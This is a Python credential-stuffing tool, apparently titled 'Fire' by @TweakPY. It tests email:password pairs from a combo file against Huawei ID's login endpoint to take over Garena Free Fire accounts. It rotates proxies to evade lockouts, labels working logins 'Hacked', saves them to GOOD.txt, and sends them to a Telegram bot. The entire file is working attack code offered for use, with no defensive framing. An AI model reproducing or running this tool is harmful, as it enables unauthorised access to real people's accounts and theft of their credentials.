try:
	import requests,random,time,os,colorama,pyfiglet
except ModuleNotFoundError:
	os.system('pip install requests')
	os.system('pip install colorama')
	os.system('pip uninstall colorama')
	os.system('pip install colorama')
	os.system('pip install pyfiglet')
	print('\n\t>[+] Done Downloading ')
print("[$] Brute Force Free")
print(str(pyfiglet.figlet_format('Fire'))+f"TweakPY </>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print(f"By {colorama.Fore.CYAN}@TweakPY{colorama.Fore.RESET}")
ID=input('[+] Enter YOUR ID : ')
token=input('[+] Enter TOKEN BOT : ')
def CHECK(user,pess):
	proxylist=[]
	proxy=open('proxy.txt', 'r').read().splitlines()
	chars="qwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnm12345678901234567890"
	for ptk in range(1):
		ptk=""
		for item in range(30):
			ptk+=random.choice(chars)
	for ptkk in range(1):
		ptkk=""
		for item in range(30):
			ptkk+=random.choice(chars)
	for pxr in proxy:
		proxylist.append(pxr)
		pxx=str(random.choice(proxylist))
	a=ptkk
	ptkk=f'{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h{a}h'
	head={
		'Accept': 'application/json, text/plain, */*',
		'Accept-Encoding': 'gzip, deflate, br',
		'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
		'Conection': 'keep-alive',
		'Content-Length': '1063',
		'Content-Type': 'application/x-www-form-urlencoded',
		'cookie': 'JSESSIONID=4617BD52451B937CFE9D9D032623AA53240C1B88E5D67D87; VERSION_NO=UP_CAS_5.2.0.100; CAS_THEME_NAME=huawei',
		'Host': 'id7.cloud.huawei.com',
		'Origin': 'https://oauth-login.cloud.huawei.com',
		'Referer': 'https://oauth-login.cloud.huawei.com/',
		'sec-ch-ua': '\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"',
		'sec-ch-ua-mobile': '?0',
		'Sec-Fetch-Dest': 'empty',
		'Sec-Fetch-Mode': 'cors',
		'Sec-Fetch-Site': 'same-site',
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36'}
	data=f'pageToken={ptk}&pageTokenKey={ptkk}&loginUrl=https%3A%2F%2Fid7.cloud.huawei.com%3A443%2FCAS%2Fportal%2FloginAuth.html&service=https%3A%2F%2Foauth-login7.cloud.huawei.com%2Foauth2%2Fv2%2Flogin%3Fclient_id%3D100886055%26display%3Dpage%26flowID%3D1a87820c-7f65-4175-b728-71827da1cafd%26h%3D1617962729.5430%26lang%3Den-us%26redirect_uri%3Dhttps%253A%252F%252F100067.connect.garena.com%252Foauth%252Flogin%253Fresponse_type%253Dtoken%2526locale%253Dzh-TW%2526redirect_uri%253Dhttps%25253A%25252F%25252Freward.ff.garena.com%25252F%2526client_id%253D100067%2526all_platforms%253D1%2526platform%253D7%26response_type%3Dcode%26scope%3Dopenid%2Bhttps%253A%252F%252Fwww.huawei.com%252Fauth%252Faccount%252Fbase.profile%26v%3Da60d2237058821bae0939d3777d9de5f5552e2ad07d4fe0ee70babb3b3dd3644&loginChannel=90000300&reqClientType=90&lang=en-us&isThirdBind=0&hwmeta=&userAccount={user}&password={pess}&clientID=100886055&languageCode=en-us'
	try:
		time.sleep(0.1)
		proxx={
			'http': f'http://{pxx}',
			'https': f'http://{pxx}'}
		req=requests.post(f'https://id7.cloud.huawei.com/CAS/IDM_W/ajaxHandler/remoteLogin?reflushCode=0.9373766246178068',headers=head,data=data,proxies=proxx,timeout=3)
		if req.json()['isSuccess']==1:
			c=str(req.json()['callbackURL'])
			print(colorama.Fore.GREEN+'--------------------------------')
			print(f'Hacked: [{user}:{pess}] ')
			print('need Verify Or ChangePhone:', req.json()['needVerifyOrChangePhone'])
			print('need Pop Trust:', req.json()['needPopTrust'])
			print('qrCode Login SuccessFlag:', req.json()['qrCodeLoginSuccessFlag'])
			print('Country Code:', c.split('countryCode=')[1])
			YES=f"""
[✓] Hacked Free Fire :
[✓] Email: {user}
[✓] Pass: {pess}
[✓] need Verify Or ChangePhone:{req.json()['needVerifyOrChangePhone']}
[✓] need Pop Trust:{req.json()['needPopTrust']}
[✓] qrCode Login SuccessFlag:{req.json()['qrCodeLoginSuccessFlag']}
[✓] Country Code:{c.split('countryCode=')[1]}
━━━━━━━━━━━━━"""
			print("[/] Enjoy")
			print('--------------------------------'+colorama.Fore.RESET)
			try:
				requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={YES}\nBY @TweakPY @vv1ck 💸')
			except:
				pass
			with open('GOOD.txt', 'a') as x:
				x.write(f'{user}:{pess}' + '\n')
		elif req.json()['errorCode']=='10000400':
			print(colorama.Fore.RED+f"NOT HACKED : [{user}:{pess}]")
		try:
			if req.json()["errorCode"]=='10000510':
				print(colorama.Fore.RED+f"NOT HACKED : [{user}:{pess}]")
			elif 'Warning: try login too many times.' in req.text:
				print(colorama.Fore.RED+f"NOT HACKED-Ban coming : [{user}:{pess}]")
			elif req.json()['errorCode']=='10002058':
				print(colorama.Fore.RED+f"NOT HACKED-Ban : [{user}:{pess}]")
			elif req.json()['errorCode']=='10001105':
				print(colorama.Fore.RED+f"NOT HACKED : [{user}:{pess}]")
			elif 'fail to check randomCode.' in req.text:
				print(colorama.Fore.RED+'Fail Come Back Later')
			else:
				print(colorama.Fore.RED+f"NOT HACKED : [{user}:{pess}]")
		except:
			pass
	except requests.exceptions.ConnectionError:
		print(colorama.Fore.RED+"[-] Bad Proxy !!"+colorama.Fore.RESET)
	except KeyboardInterrupt:
		exit(0)
def FILname():
	F=input('[+] Enter The Combo File Name : ')
	print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	try:
		for x in open(f'{F}.txt','r').read().splitlines():
			user=x.split(":")[0]
			pess=x.split(":")[1]
			CHECK(user,pess)
	except FileNotFoundError:
		print(colorama.Fore.RED+'\n[-] The file name is incorrect !\n'+colorama.Fore.RESET)
		return FILname()
FILname()
